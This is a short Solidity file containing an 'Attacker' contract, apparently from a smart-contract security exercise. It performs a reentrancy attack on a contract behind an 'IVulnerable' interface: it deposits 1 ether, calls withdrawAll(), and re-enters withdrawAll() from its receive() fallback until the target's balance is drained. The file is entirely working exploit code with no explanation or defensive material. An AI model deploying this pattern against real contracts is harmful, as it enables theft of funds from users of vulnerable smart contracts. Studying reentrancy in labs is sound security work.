// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function withdraw() external;

    function deposit() external payable;

    function userBalance(address) external;

    function withdrawAll() external;
}

contract Attacker {
    IVulnerable public target;
    bool public firstTimeDeposit;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawAll();
        }
    }

    function exploit() public payable {
        //Deposit funds
        target.deposit{value: 1 ether}();

        target.withdrawAll();
    }
}
